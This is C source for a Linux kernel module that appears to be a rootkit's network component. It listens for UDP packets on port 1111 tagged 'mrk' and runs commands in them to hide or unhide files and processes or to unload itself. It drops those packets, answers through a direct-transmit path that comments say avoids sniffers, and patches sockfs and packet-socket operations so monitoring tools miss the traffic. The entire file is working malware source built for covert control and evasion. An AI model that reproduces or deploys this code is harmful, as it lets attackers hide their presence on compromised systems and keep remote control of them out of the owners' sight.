#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/net_namespace.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#include <linux/list.h>

#include "headers/main.h"
#include "internal.h"

#define CMD_MAGIC ("mrk")
#define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
#define CMD_PORT (1111)
#define RESPONSE_DATA_LEN (3)
#define RESPONSE_HEADER_LEN (sizeof(struct udphdr) + sizeof(struct iphdr) + ETH_HLEN)

typedef u16 job_id_t;

struct cmd_type {
    char *name;
    int (*func)(const char *path);
};

static int exit_func(const char *_) {
    MRK_exit();
    return 0;
}

struct cmd_type cmds[] = {
    {
        "hfile",
        hide_file
    },
    {
        "ufile",
        unhide_file
    },
    {
        "hproc",
        hide_process
    },
    {
        "uproc",
        unhide_process
    },
    {
        "fexit",
        exit_func
    }
};


static int send_response(
    job_id_t job_id,
    char response_status,
    __be32 local_ip,
    __be32 remote_ip,
    __be16 remote_port,    
    unsigned char remote_mac[ETH_ALEN],
    struct net_device *dev
) {
    struct iphdr *iph = NULL;
    struct udphdr *udph = NULL;
    struct ethhdr *eth = NULL;
    struct sk_buff *skb = NULL;
    char *data = NULL;
    printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
    skb = alloc_skb(RESPONSE_DATA_LEN + RESPONSE_HEADER_LEN, GFP_ATOMIC);
    if (!skb) {
        printk(KERN_INFO "failed allocating skb\n");
        return -1;
    }
    skb_reserve(skb, RESPONSE_HEADER_LEN);
    data = skb_put(skb, RESPONSE_DATA_LEN);

    // put response data.
    *(unsigned short *)data = job_id;
    put_unaligned(response_status, data + 2);

    skb_push(skb, sizeof(struct udphdr));
    skb_reset_transport_header(skb);
    udph = udp_hdr(skb);
    udph->source = htons(CMD_PORT);
    udph->dest = remote_port;
    udph->len = htons(RESPONSE_DATA_LEN + sizeof(struct udphdr));
    udph->check = 0;
    udph->check = csum_tcpudp_magic(
        local_ip,
        remote_ip,
        RESPONSE_DATA_LEN + sizeof(struct udphdr),
        IPPROTO_UDP,
        csum_partial(
            udph,
            RESPONSE_DATA_LEN + sizeof(struct udphdr),
            0
        )
    );

    if (udph->check == 0) udph->check = CSUM_MANGLED_0;

    skb_push(skb, sizeof(*iph));
    skb_reset_network_header(skb);
    iph = ip_hdr(skb);
    iph->version = IPVERSION;
    iph->ihl = sizeof(struct iphdr) / 4;
    iph->tos = 0;
    iph->tot_len = htons(RESPONSE_DATA_LEN + sizeof(struct udphdr) + sizeof(struct iphdr));
    iph->id       = 0;
    iph->frag_off = 0;
    iph->ttl      = IPDEFTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check    = 0;
    iph->saddr = local_ip;
    iph->daddr = remote_ip;
    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

    eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
    skb_reset_mac_header(skb);
    skb->protocol = eth->h_proto = htons(ETH_P_IP);
    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, remote_mac, ETH_ALEN);

    skb->dev = dev;

    // We want to trasmit the packet directly so it won't be accounted or sniffed by raw sockets.
    // Therefore, we use `dev_direct_xmit` instead of the standard `dev_queue_xmit`.

    // The rx_queue index must be smaller then dev->real_num_rx_queues, otherwise a warning will be thrown.
    // TODO: Should the selected queue be randomized?
    if (skb->dev->real_num_rx_queues == 0) return -1;
    return dev_direct_xmit(skb, 0);
}

struct MRK_command_work {
    struct work_struct work;
    struct cmd_type *cmd;
    const char *arg;
    job_id_t job_id;
    __be32 remote_addr;
    __be32 local_addr;
    __be16 remote_port;
    unsigned char remote_mac[ETH_ALEN];
    struct net_device *dev;
};

static void handle_command(struct work_struct *work) {
    int result = -1;
    struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
    result = command_work->cmd->func(command_work->arg);
    printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
    send_response(
        command_work->job_id, 
        result, 
        command_work->local_addr,
        command_work->remote_addr,
        command_work->remote_port,
        command_work->remote_mac,
        command_work->dev
    );
    // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
    // It is permissible to free the struct work_struct from inside the function that is called from it.
    kfree(command_work->arg);
    kfree(work);
}

static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
    struct udphdr *udph = NULL;
    int user_data_len = 0;

    udph = udp_hdr(skb);
    user_data_len = ntohs(udph->len) - sizeof(struct udphdr);

    #ifdef NET_SKBUFF_DATA_USES_OFFSET
    *user_data = skb->head + skb->tail - user_data_len;
    #else
    *user_data = skb->tail - user_data_len;
    #endif
    
    return user_data_len;
}

static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
    struct cmd_type *cmd = NULL;
    for (cmd = cmds; cmd < (cmds + ARRAY_SIZE(cmds)); ++cmd) {
        if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
            return cmd;
        }
    }
    return NULL;
}

static int is_skb_cmd(struct sk_buff *skb) {
    struct iphdr *iph;
    struct udphdr *udph;
    const char *user_data;
    int user_data_len;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP) return 0;

    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != CMD_PORT) return 0;

    user_data_len = get_udp_user_data(skb, &user_data);

    if (user_data_len < CMD_MAGIC_LEN) return 0;

    return !strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN);
}

static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph = NULL;
    struct udphdr *udph = NULL;
    const char *user_data = NULL;
    int user_data_len = 0;
    job_id_t job_id = 0;
    struct cmd_type *cmd = NULL;
    struct MRK_command_work *command_work = NULL;
    char *arg = NULL;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;

    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != CMD_PORT) return NF_ACCEPT;

    user_data_len = get_udp_user_data(skb, &user_data);

    if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
    user_data += CMD_MAGIC_LEN;
    user_data_len -= CMD_MAGIC_LEN;

    job_id = get_unaligned((job_id_t *)user_data);
    user_data += sizeof(job_id_t);
    user_data_len -= sizeof(job_id_t);

    cmd = match_buffer_to_cmd_type(user_data);
    if (cmd == NULL) return NF_ACCEPT;
    user_data += strlen(cmd->name);
    user_data_len -= strlen(cmd->name);

    command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
    INIT_WORK(&command_work->work, handle_command);
    command_work->cmd = cmd;
    // we want the argument to be null-terminated.
    arg = kmalloc(user_data_len + 1, GFP_KERNEL);
    memcpy(arg, user_data, user_data_len);
    arg[user_data_len] = '\0';
    command_work->arg = arg;
    command_work->job_id = job_id;
    command_work->local_addr = iph->daddr;
    command_work->remote_addr = iph->saddr;
    command_work->remote_port = udph->source;
    memcpy(command_work->remote_mac, eth_hdr(skb)->h_source, ETH_ALEN);
    command_work->dev = skb->dev;

    schedule_work(&command_work->work);
    return NF_DROP;
}

static struct inode *(*original_alloc_inode)(struct super_block *sb);

struct nf_hook_ops *net_hook = NULL;

static const struct proto_ops *original_packet_ops = NULL;

// static __poll_t new_packet_poll(struct file *file, struct socket *sock,
// 				poll_table *wait)
// {
//     __poll_t result = original_packet_ops->poll(file, sock, wait);
//     printk(KERN_INFO "packet socket polled!\n");
//     return result;
// }

// static int new_packet_recvmsg(struct socket *sock, struct msghdr *msg, size_t len,
// 			  int flags) 
// {
//     int result = original_packet_ops->recvmsg(sock, msg, len, flags);
//     printk(KERN_INFO "packet socket recvmsg!\n");
//     return result;
// }
void hook_packet_sock(struct socket *sock);

static int new_packet_setsockopt(struct socket *sock, int level, int optname,
		    char __user *optval, unsigned int optlen)
{
    printk(KERN_INFO "packet socket setsockopt!\n");
    int result = original_packet_ops->setsockopt(sock, level, optname, optval, optlen);
    hook_packet_sock(sock);
    return result;
}

static int (*original_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
		      struct packet_type *pt, struct net_device *orig_dev) = NULL;


static int packet_no_rcv(struct sk_buff *skb, struct net_device *dev,
		      struct packet_type *pt, struct net_device *orig_dev)
{
    if (is_skb_cmd(skb)) {
        kfree_skb(skb);
        return 0;
    }
    return original_packet_rcv(skb, dev, pt, orig_dev);
}

int is_packet_sock(struct socket *sock) {
    if (!sock->sk) return 0;
    return sock->sk->sk_family == PF_PACKET;
}

static DEFINE_SPINLOCK(hook_packet_lock);

void hook_packet_sock(struct socket *sock) {
    struct proto_ops *new_ops;
    struct packet_sock *po = pkt_sk(sock->sk);
    if (original_packet_ops == NULL || sock->ops == original_packet_ops) {
        printk(KERN_INFO "patching socket ops!\n");
        original_packet_ops = sock->ops;
        new_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
        memcpy(new_ops, original_packet_ops, sizeof(struct proto_ops));
    //     new_ops->poll = new_packet_poll;
    //     new_ops->recvmsg = new_packet_recvmsg;
        new_ops->setsockopt = new_packet_setsockopt;
        sock->ops = new_ops;
    }
    if (original_packet_rcv == NULL || po->prot_hook.func != packet_no_rcv) {
        printk(KERN_INFO "patching socker packet rcv!\n");
        original_packet_rcv = po->prot_hook.func;
        po->prot_hook.func = packet_no_rcv;
    }
}

int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
    // struct sk_buff *skb;
    unsigned long _flags;
    struct socket *sock = (struct socket *)wq_entry->private;
    
    if (is_packet_sock(sock)) {
        spin_lock_irqsave(&hook_packet_lock, _flags);
        hook_packet_sock(sock);
	    spin_unlock_irqrestore(&hook_packet_lock, _flags);
        // skb_queue_walk(&sock->sk->sk_receive_queue, skb) {
        //     printk(KERN_INFO "packet socket has buffer!\n");

        // }
    } else {
        list_del_init(&wq_entry->entry);
    }
    return 0;
}

struct unhooked_socket_entry {
    struct list_head head;
    struct socket *sock;
};

static LIST_HEAD(unhooked_sockets);

static struct inode *new_alloc_inode(struct super_block *sb) {
    struct inode *res;
    struct socket *sock;
    struct wait_queue_entry *wq;
    struct unhooked_socket_entry *s_entry;

    res = original_alloc_inode(sb);
    sock = SOCKET_I(res);

    /* Add wait queue entry */
    wq = kmalloc(sizeof(struct wait_queue_entry), GFP_KERNEL);
    init_waitqueue_func_entry(wq, &my_wake_up);
    wq->private = sock;
    add_wait_queue(&sock->wq.wait, wq);

    /* Add to unhooked queue */
    s_entry = kmalloc(sizeof(struct unhooked_socket_entry), GFP_KERNEL);
    s_entry->sock = sock;
    list_add_tail(&s_entry->head, &unhooked_sockets);

    return res;
}

static DEFINE_SPINLOCK(unhooked_sockets_lock);

static int my_d_init(struct dentry *dentry)
{
    struct unhooked_socket_entry *s_entry;
    struct unhooked_socket_entry *temp;
    unsigned long flags;
    unsigned long flags2;

    /* Handle unhooked queue */
    spin_lock_irqsave(&unhooked_sockets_lock, flags2);
	list_for_each_entry_safe(s_entry, temp, &unhooked_sockets, head) {
        spin_lock_irqsave(&hook_packet_lock, flags);
        if (is_packet_sock(s_entry->sock)) {
            hook_packet_sock(s_entry->sock);
        }
        list_del(&s_entry->head);
        kfree(s_entry);
        spin_unlock_irqrestore(&hook_packet_lock, flags);
    }
    spin_unlock_irqrestore(&unhooked_sockets_lock, flags2);
	return 0;
}

int MRK_init_nethook(void) {
    int res;
    struct file_system_type *fs_type;
    struct super_block *super;
    struct super_operations *s_op;
    struct dentry_operations *s_d_op;
    net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
    net_hook->hook = MRK_hookfn;
    net_hook->hooknum = NF_INET_PRE_ROUTING;
    net_hook->pf = PF_INET;
    net_hook->priority = NF_IP_PRI_FILTER;
    if ((res = nf_register_net_hook(&init_net, net_hook))) {
        return res;
    }
    fs_type = get_fs_type("sockfs");
    hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
        s_op = (struct super_operations *)kmalloc(sizeof(struct super_operations), GFP_KERNEL);
        memcpy(s_op, super->s_op, sizeof(struct super_operations));
        super->s_op = s_op;
        original_alloc_inode = s_op->alloc_inode;
        s_op->alloc_inode = &new_alloc_inode;

        s_d_op = (struct dentry_operations *)kmalloc(sizeof(struct dentry_operations), GFP_KERNEL);
        memcpy(s_d_op, super->s_d_op, sizeof(struct dentry_operations));
        super->s_d_op = s_d_op;
        
        s_d_op->d_init = &my_d_init;
    }
    return 0;
}

void MRK_exit_nethook(void) {
    nf_unregister_net_hook(&init_net, net_hook);
    kfree(net_hook);
}
